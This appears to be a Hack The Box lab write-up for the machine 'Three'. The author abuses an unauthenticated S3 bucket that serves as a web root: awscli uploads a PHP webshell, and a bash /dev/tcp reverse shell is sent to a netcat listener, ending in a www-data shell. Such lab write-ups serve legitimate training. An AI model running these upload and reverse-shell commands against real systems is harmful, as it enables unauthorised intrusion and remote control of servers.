
When we discover an S3 Bucket on an webserver, we can utilize "awscli" and we can even upload files onto the S3 Bucket!

---

1. We need to configure the awscli.

```
aws configure

Tip: You can deliver temporary credentials to the AWS CLI using your AWS Console session by running the command 'aws login'.

AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
```

We can list all of the S3 Buckets hosted by the server by using the ls command.

```
aws s3 ls --endpoint=http://s3.thetoppers.htb
2026-08-12 18:49:05 thetoppers.htb
```

We can also use the ls command to list objects and common prefixes under the specified bucket.

```
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2026-08-12 18:49:05          0 .htaccess
2026-08-12 18:49:05      11952 index.php
```

This seems to be the web-root, so the apache webserver is using the S3 bucket as storage.
awscli allows us to upload/copy files to a remote bucket. 

Let's upload an webshell onto the S3 Bucket.

```
aws --endpoint=http://s3.thetoppers.htb s3 cp /opt/tools/wolfswebshell.php s3://thetoppers.htb
```

Gained Command Execution.

Started up netcat listener on my local machine.

```
nc -lvnp 8080
```

Executed the following bash reverse shell in my webshell.

```
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.44/8080 0>&1'
```

Gained RCE.

```
nc -lvnp 8080                                                
listening on [any] 8080 ...
connect to [10.10.14.44] from (UNKNOWN) [10.129.227.248] 35164
bash: cannot set terminal process group (1487): Inappropriate ioctl for device
bash: no job control in this shell
www-data@three:/tmp$
```